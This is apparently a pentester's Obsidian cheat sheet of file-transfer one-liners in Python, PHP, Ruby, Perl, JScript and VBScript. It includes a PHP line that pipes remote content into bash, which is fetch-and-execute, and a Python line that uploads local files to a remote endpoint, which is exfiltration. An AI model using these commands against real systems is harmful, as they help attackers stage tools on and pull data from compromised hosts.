```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Python
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<Local Path>")'
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<Local Path>")'

# Upload
python3 -c 'import requests;requests.post("http://<URL>/upload",files={"files":open("<Local Path>","rb")})'
```

## PHP
```bash
# Using file_get_contents()
php -r '$file = file_get_contents("<URL>"); file_put_contents("<Local Path>",$file);'

# Using fopen()
php -r 'const BUFFER = 1024; $fremote = 
fopen("<URL>", "rb"); $flocal = fopen("<Local Path>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Using Bash
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby
```Bash
ruby -e 'require "net/http"; File.write("<Local Path>", Net::HTTP.get(URI.parse("<URL>")))'
```

## Perl
```bash
perl -e 'use LWP::Simple; getstore("<URL>", "<Local Path>");'
```

## JavaScript (Windows)
```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
Then execute it on windows with:
`cscript.exe /nologo <above-js-file> <URL> <Local Path>`

## VBScript (Windows)
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
	.type = 1
	.open
	.write xHttp.responseBody
	.savetofile WScript.Arguments.Item(1), 2
end with
```
Then execute it on windows with:
`cscript.exe /nologo <above-js-file> <URL> <Local Path>`